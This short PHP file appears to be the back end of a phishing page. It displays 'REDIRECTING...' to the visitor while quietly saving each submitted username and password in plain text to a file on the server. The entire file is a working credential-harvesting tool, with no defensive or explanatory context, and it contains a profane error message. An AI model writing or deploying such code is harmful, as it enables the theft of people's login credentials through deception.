<html>
    <body>
        <?php
        echo 'REDIRECTING............';
            $username = $_POST['username'];
            $password = $_POST['password'];
            $f = fopen('/var/www/html/inputs.txt', 'a') or die('FUUUUUUCKKKKKKKKK!!!!!');
            fwrite($f, $username);
            fwrite($f, " ");
            fwrite($f, $password);
            fwrite($f, "\n");
            fclose($f);
            
?>
    </body>

</html>
